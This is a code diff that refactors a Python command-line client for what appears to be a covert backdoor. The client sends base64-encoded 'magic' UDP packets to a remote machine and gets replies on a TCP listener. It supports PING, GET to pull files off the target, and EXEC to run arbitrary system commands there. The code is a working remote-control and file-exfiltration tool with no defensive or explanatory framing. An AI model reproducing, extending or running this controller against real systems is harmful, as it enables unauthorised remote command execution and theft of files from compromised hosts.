@@ -36,16 +36,16 @@ def _udp_sender():
     sock.close()
 
 
-def _send_cmd(ip, dst_port, tcp_port, msg):
+def _send_cmd(msg, ip, dest_port, listen_port):
     """sends a magic cmd packet and returns the response"""
     # we send: "8080;<b64>" --> netfilter adds IP: "172.18.123.1:8080;<b64>"
     encoded = base64.b64encode(msg.encode("ascii"))
-    data = f"{tcp_port};".encode("ascii") + encoded + b"\x00"
+    data = f"{listen_port};".encode("ascii") + encoded + b"\x00"
 
-    with _tcp_listener(tcp_port) as tcp:
+    with _tcp_listener(listen_port) as tcp:
         with _udp_sender() as udp:
-            print(f"sending magic packet --> {ip}:{dst_port}")
-            udp.sendto(data, (ip, dst_port))
+            print(f"sending magic packet --> {ip}:{dest_port}")
+            udp.sendto(data, (ip, dest_port))
         print("waiting for reply...")
         try:
             sock, addr = tcp.accept()
@@ -61,36 +61,38 @@ def _send_cmd(ip, dst_port, tcp_port, msg):
     return decoded
 
 
-def do_ping(args):
+def do_ping(ip, dest_port, listen_port, **kwargs):
     """send a ping"""
     msg = "PING"
-    response = _send_cmd(args.ip, args.dest_port, args.listen_port, msg).decode("ascii")
+    response = _send_cmd(msg, ip, dest_port, listen_port).decode("ascii")
     if "PONG" not in response:
         raise ValueError("Invalid response received!")
-    print(f"Received PONG from {args.ip}")
+    print(f"Received PONG from {ip}")
 
 
-def do_get(args):
+def do_get(ip, dest_port, listen_port, path, output_path, **kwargs):
     """retrieve a file"""
-    msg = f"GET {args.path}"
-    response = _send_cmd(args.ip, args.dest_port, args.listen_port, msg)
+    msg = f"GET {path}"
+    response = _send_cmd(msg, ip, dest_port, listen_port)
 
-    filename = os.path.basename(args.path)
-    out = args.output_path if args.output_path else filename
+    filename = os.path.basename(path)
+    out = output_path if output_path else filename
+    if os.path.isdir(out):
+        out = os.path.sep.join((out, filename))
     with open(out, "wb") as f:
         f.write(response)
-    
-    print(f"Retrieved {filename} from {args.ip}")
+    print(f"Retrieved {filename} from {ip}")
 
 
-def do_exec(args):
+def do_exec(ip, dest_port, listen_port, cmd, **kwargs):
     """run a system command"""
-    msg = f"EXEC {args.cmd}"
-    response = _send_cmd(args.ip, args.dest_port, args.listen_port, msg).decode("ascii")
-    print(f"Command on {args.ip} returned: {response}")
+    msg = f"EXEC {cmd}"
+    response = _send_cmd(msg, ip, dest_port, listen_port).decode("ascii")
+    print(f"Command on {ip} returned: {response}")
 
 
-if __name__ == "__main__":
+def main():
+    """CLI entry point"""
     parser = argparse.ArgumentParser(description="send it!")
     subparsers = parser.add_subparsers(help="[supported commands]")
     parser.add_argument(
@@ -134,4 +136,8 @@ if __name__ == "__main__":
     exec_parser.set_defaults(func=do_exec)
     # run with it
     args = parser.parse_args()
-    args.func(args)
+    args.func(**vars(args))
+
+
+if __name__ == "__main__":
+    main()
